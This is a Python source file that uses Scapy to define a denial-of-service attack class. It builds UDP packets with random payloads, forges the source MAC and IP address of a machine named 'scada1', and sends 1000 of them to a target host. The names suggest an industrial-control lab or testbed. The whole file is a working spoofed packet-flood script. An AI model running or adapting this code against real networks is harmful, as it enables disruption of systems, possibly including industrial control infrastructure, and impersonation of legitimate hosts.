from dos_header import machines
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP, UDP, ICMP, icmptypes
from scapy.data import ETHER_TYPES



class DOSAttack:
    def __init__(self):
        pass
    
    def start_attack(self, target_name, src_name, pkt_len, cnt=1000):
        # By default ether type is ipv4
        # TODO: Crosscheck if ether type should be 0x800 or IPv4
        # TODO: Raw len vs pkt len - sorted, same.
        # TODO: IP flags,id ?
        load = os.urandom(pkt_len)
        pkt = Ether(dst=machines[target_name]['mac'], 
                    src=machines[src_name]['mac'],
                    type = ETHER_TYPES['IPv4'])/\
              IP(dst=machines[target_name]['ip'],
                 src=machines[src_name]['ip'],)/\
              UDP(dport=machines[target_name]['port'],
                  sport=machines[src_name]['port'])/\
              Raw(load=load)
        print(len(load))

              
        sendp(pkt, iface="eth2", count=cnt)
        pkt.show2()

if __name__ == "__main__":
    attack = DOSAttack()
    attack.start_attack("mini3", "scada1", 100, 1000)
